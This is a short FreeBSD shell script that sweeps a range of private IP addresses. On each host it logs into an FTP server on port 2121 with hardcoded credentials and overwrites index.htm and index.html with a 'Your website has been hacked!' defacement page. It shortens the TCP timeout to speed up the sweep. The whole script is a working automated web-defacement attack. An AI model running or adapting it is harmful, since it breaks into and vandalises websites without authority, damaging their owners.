#!/bin/sh
# Tested in FreeBSD

sudo sysctl net.inet.tcp.keepinit=1000

for i in `jot 49 10`
do
echo "Your website has been hacked!<br>192.168.54.$i<br>`date +%Y-%m-%d%n%H:%M:%S`" > index.htm
echo "Your website has been hacked!<br>192.168.54.$i<br>`date +%Y-%m-%d%n%H:%M:%S`" > index.html
ftp -n 192.168.54.$i 2121 << EOF
user 08ecg5 08ecg5
put index.htm
put index.html
quit
EOF
rm index.*
done

sudo sysctl net.inet.tcp.keepinit=75000
